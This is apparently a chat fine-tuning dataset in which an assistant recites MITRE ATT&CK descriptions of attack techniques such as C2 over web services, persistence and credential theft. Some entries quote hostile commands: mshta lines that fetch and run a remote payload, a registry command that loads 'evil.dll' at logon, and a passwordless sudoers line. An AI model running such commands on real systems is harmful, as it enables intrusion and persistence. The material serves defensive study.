{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'One-Way Communication' and with the Id: T1102.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'One-Way Communication' and with the Id: T1102.003 is described as follows: Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Gather Victim Network Information' and with the Id: T1590 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Gather Victim Network Information' and with the Id: T1590 is described as follows: Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation of Remote Services' and with the Id: T1210 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation of Remote Services' and with the Id: T1210 is described as follows: Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Parent PID Spoofing' and with the Id: T1502 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Parent PID Spoofing' and with the Id: T1502 is described as follows: Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via VBA [Scripting](https://attack.mitre.org/techniques/T1064) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)Explicitly assigning the PPID may also enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given appropriate access rights to the parent process). For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keychain' and with the Id: T1142 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keychain' and with the Id: T1142 is described as follows: Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The <code>security</code> command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. (Citation: External to DA, the OS X Way) By default, the passphrase for the keychain is the user\u2019s logon credentials.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Internal Spearphishing' and with the Id: T1534 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Internal Spearphishing' and with the Id: T1534 is described as follows: After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating [Impersonation](https://attack.mitre.org/techniques/T1656).(Citation: Trend Micro - Int SP)For example, adversaries may leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) or [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through [Input Capture](https://attack.mitre.org/techniques/T1056) on sites that mimic login interfaces.Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.(Citation: Int SP - chat apps). The systems targeted by this attack pattern are: Windows, macOS, Linux, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Sudo' and with the Id: T1169 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Sudo' and with the Id: T1169 is described as follows: The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Services File Permissions Weakness' and with the Id: T1574.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Services File Permissions Weakness' and with the Id: T1574.010 is described as follows: Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Registry Run Keys / Startup Folder' and with the Id: T1547.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Registry Run Keys / Startup Folder' and with the Id: T1547.001 is described as follows: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.The following Registry keys can be used to set startup folder items for persistence:* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>The following Registry keys can control automatic startup of services during boot:* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Trusted Relationship' and with the Id: T1199 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Trusted Relationship' and with the Id: T1199 is described as follows: Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration). The systems targeted by this attack pattern are: Windows, SaaS, IaaS, Linux, macOS, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Account' and with the Id: T1136.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Account' and with the Id: T1136.003 is described as follows: Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)In addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.Once an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).. The systems targeted by this attack pattern are: Azure AD, Office 365, IaaS, Google Workspace, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Groups' and with the Id: T1069.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Groups' and with the Id: T1069.001 is described as follows: Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LC_MAIN Hijacking' and with the Id: T1149 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LC_MAIN Hijacking' and with the Id: T1149 is described as follows: **This technique has been deprecated and should no longer be used.**As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the binary\u2019s entry point for execution. Previously, there were two headers to achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry point for a binary can be hijacked so that initial execution flows to a malicious addition (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn\u2019t know anything was different  (Citation: Methods of Mac Malware Persistence). By modifying a binary in this way, application whitelisting can be bypassed because the file name or application path is still the same.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Search Open Websites/Domains' and with the Id: T1593 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Search Open Websites/Domains' and with the Id: T1593 is described as follows: Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Account Manipulation' and with the Id: T1098 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Account Manipulation' and with the Id: T1098 is described as follows: Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, IaaS, Linux, macOS, Google Workspace, SaaS, Network, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Mshta' and with the Id: T1170 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Mshta' and with the Id: T1170 is described as follows: Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Alternative Protocol' and with the Id: T1048 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Alternative Protocol' and with the Id: T1048 is described as follows: Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques)Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, IaaS, Google Workspace, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Kernel Modules and Extensions' and with the Id: T1547.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Kernel Modules and Extensions' and with the Id: T1547.006 is described as follows: Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming)\u00a0When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide)\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap). The systems targeted by this attack pattern are: macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'GUI Input Capture' and with the Id: T1056.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'GUI Input Capture' and with the Id: T1056.002 is described as follows: Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)Adversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.. The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pass the Ticket' and with the Id: T1097 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pass the Ticket' and with the Id: T1097 is described as follows: Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.In this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Tool' and with the Id: T1588.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Tool' and with the Id: T1588.002 is described as follows: Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration over USB' and with the Id: T1052.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration over USB' and with the Id: T1052.001 is described as follows: Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
